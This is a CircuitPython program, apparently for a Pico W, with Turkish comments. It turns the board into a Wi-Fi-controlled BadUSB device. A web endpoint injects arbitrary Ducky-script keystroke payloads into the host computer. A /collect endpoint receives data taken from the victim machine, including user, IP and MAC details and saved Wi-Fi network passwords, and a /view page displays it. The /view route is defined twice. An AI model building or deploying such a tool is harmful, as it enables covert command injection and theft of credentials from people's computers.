import wifi
import socketpool
import time
import random
import digitalio
import board
import usb_hid
from adafruit_httpserver import Server, Request, JSONResponse, POST, Response
from adafruit_hid.mouse import Mouse
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

# Duck import
try:
    from duck import exe
    duck_ok = True
except:
    duck_ok = False
    print("Duck yok!")

# Tuşlar
try:
    from duck import duckyCommands
    safe_keys = [v for v in duckyCommands.values() if isinstance(v, int) and Keycode.A <= v <= Keycode.Z]
    safe_keys.extend([Keycode.ENTER, Keycode.CAPS_LOCK])
except:
    safe_keys = [Keycode.A, Keycode.B, Keycode.ENTER, Keycode.CAPS_LOCK]

# WiFi
wifi.radio.start_ap("FATİHH", "12345678")
print(f"IP: {wifi.radio.ipv4_address}")

# Pinler
gp5 = digitalio.DigitalInOut(board.GP5)
gp6 = digitalio.DigitalInOut(board.GP6)
gp5.pull = digitalio.Pull.UP
gp6.pull = digitalio.Pull.UP

# HID
mouse = Mouse(usb_hid.devices)
kbd = Keyboard(usb_hid.devices)
jiggler_running = False
last_data = {}

def mouse_jiggle():
    global jiggler_running
    jiggler_running = True
    while jiggler_running and not gp5.value:
        mouse.move(random.randint(-100, 100), random.randint(-100, 100))
        time.sleep(0.1)
        server.poll()
    jiggler_running = False

def combined_jiggle():
    global jiggler_running
    jiggler_running = True
    while jiggler_running and not gp6.value:
        if random.random() < 0.5:
            mouse.move(random.randint(-100, 100), random.randint(-100, 100))
        else:
            kbd.press(random.choice(safe_keys))
            time.sleep(0.05)
            kbd.release_all()
        time.sleep(0.1)
        server.poll()
    jiggler_running = False

# Server
pool = socketpool.SocketPool(wifi.radio)
server = Server(pool, debug=False)

@server.route("/")
def base(request: Request):
    with open("index.html", "r") as f:
        return Response(request, f.read(), headers={"Content-Type": "text/html"})

@server.route("/api", POST)
def api(request: Request):
    try:
        data = request.json()
        payload = data.get("content", "")
        if duck_ok and payload:
            exe(payload.splitlines())
        return JSONResponse(request, {"status": "ok"})
    except Exception as e:
        print(f"API hatası: {e}")
        return JSONResponse(request, {"status": "error"}, status=500)

@server.route("/jiggle/mouse", POST)
def api_mouse(request: Request):
    global jiggler_running
    if not jiggler_running:
        jiggler_running = True
        for _ in range(50):
            if not jiggler_running: break
            mouse.move(random.randint(-100, 100), random.randint(-100, 100))
            time.sleep(0.1)
        jiggler_running = False
    return JSONResponse(request, {"status": "ok"})

@server.route("/jiggle/combined", POST)
def api_combined(request: Request):
    global jiggler_running
    if not jiggler_running:
        jiggler_running = True
        for _ in range(50):
            if not jiggler_running: break
            if random.random() < 0.5:
                mouse.move(random.randint(-100, 100), random.randint(-100, 100))
            else:
                kbd.press(random.choice(safe_keys))
                time.sleep(0.05)
                kbd.release_all()
            time.sleep(0.1)
        jiggler_running = False
    return JSONResponse(request, {"status": "ok"})

@server.route("/jiggle/stop", POST)
def api_stop(request: Request):
    global jiggler_running
    jiggler_running = False
    return JSONResponse(request, {"status": "stopped"})

@server.route("/collect", POST)
def collect(request: Request):
    try:
        data = request.json()
        if data.get("type") == "all":
            last_data["all"] = {
                "wifi": data.get("wifi", []),
                "pc": data.get("pc", "?"),
                "user": data.get("user", "?"),
                "os": data.get("os", "?"),
                "cpu": data.get("cpu", "?")[:50],
                "ram": data.get("ram", "?"),
                "gpu": data.get("gpu", "?")[:50],
                "ip": data.get("ip", "?"),
                "mac": data.get("mac", "?"),
                "uptime": data.get("uptime", "?"),
                "tarih": data.get("tarih", "?")  # PC'den gelen tarih
            }
            print(f"✅ Veri alındı: {last_data['all']['tarih']}")
        return JSONResponse(request, {"status": "ok"})
    except:
        return JSONResponse(request, {"status": "error"}, status=500)

@server.route("/view")
def view(request: Request):
    html = """<html><head><meta charset='UTF-8'><style>
        body{font-family:Arial;background:#1a1a1a;color:#0f0;padding:20px}
        h2{color:#fff} .box{background:#000;padding:15px;border-radius:5px}
        a{color:#fff;background:#333;padding:10px;text-decoration:none;border-radius:5px}
    </style></head><body><h2>📊 Toplanan Bilgiler</h2><div class='box'>"""
    
    if "all" in last_data:
        d = last_data["all"]
        html += f"<b>🕐 Toplanma Zamanı:</b> {d.get('tarih','?')}<br><br>"
        html += f"<b>💻 PC:</b> {d.get('pc','?')}<br>"
        html += f"<b>👤 Kullanıcı:</b> {d.get('user','?')}<br>"
        html += f"<b>🖥️ Sistem:</b> {d.get('os','?')}<br>"
        html += f"<b>⚡ CPU:</b> {d.get('cpu','?')}<br>"
        html += f"<b>🧠 RAM:</b> {d.get('ram','?')} GB<br>"
        html += f"<b>🎮 GPU:</b> {d.get('gpu','?')}<br>"
        html += f"<b>🌐 IP:</b> {d.get('ip','?')}<br>"
        html += f"<b>🔌 MAC:</b> {d.get('mac','?')}<br>"
        html += f"<b>⏰ Son Açılış:</b> {d.get('uptime','?')}<br><br>"
        html += "<b>🔑 WiFi:</b><br>"
        for w in d.get("wifi", []):
            html += f"• {w.get('ssid','?')}: {w.get('pwd','?')}<br>"
    else:
        html += "Veri yok."
    
    html += "</div><br><a href='/'>← Geri</a></body></html>"
    return Response(request, html, headers={"Content-Type": "text/html"})

@server.route("/view")
def view(request: Request):
    html = """<html><head><meta charset='UTF-8'><style>
        body{font-family:Arial;background:#1a1a1a;color:#0f0;padding:20px}
        h2{color:#fff} .box{background:#000;padding:15px;border-radius:5px}
        a{color:#fff;background:#333;padding:10px;text-decoration:none;border-radius:5px}
    </style></head><body><h2>📊 Toplanan Bilgiler</h2><div class='box'>"""
    
    if "all" in last_data:
        d = last_data["all"]
        html += f"<b>🕐 Alınma Zamanı:</b> {d.get('tarih','?')} {d.get('saat','?')}<br><br>"
        html += f"<b>💻 Bilgisayar:</b> {d.get('pc','?')}<br>"
        html += f"<b>👤 Kullanıcı:</b> {d.get('user','?')}<br>"
        html += f"<b>🖥️ Sistem:</b> {d.get('os','?')}<br>"
        html += f"<b>⚡ CPU:</b> {d.get('cpu','?')}<br>"
        html += f"<b>🧠 RAM:</b> {d.get('ram','?')} GB<br>"
        html += f"<b>🎮 GPU:</b> {d.get('gpu','?')}<br>"
        html += f"<b>🌐 IP:</b> {d.get('ip','?')}<br>"
        html += f"<b>🔌 MAC:</b> {d.get('mac','?')}<br>"
        html += f"<b>⏰ Son Açılış:</b> {d.get('uptime','?')}<br><br>"
        html += "<b>🔑 WiFi Şifreleri:</b><br>"
        for w in d.get("wifi", []):
            html += f"• {w.get('ssid','?')}: {w.get('pwd','?')}<br>"
    else:
        html += "Henüz veri toplanmadı."
    
    html += "</div><br><a href='/'>← Geri</a></body></html>"
    return Response(request, html, headers={"Content-Type": "text/html"})
# Ana döngü
server.start('192.168.4.1', 80)
print("✅ Sistem hazır!")
print("🔵 GP5->GND: Mouse")
print("🟢 GP6->GND: Mouse+Klavye")

while True:
    server.poll()
    if not gp5.value and not jiggler_running:
        print("🔵 GP5 tetiklendi")
        mouse_jiggle()
    elif not gp6.value and not jiggler_running:
        print("🟢 GP6 tetiklendi")
        combined_jiggle()
    time.sleep(0.1)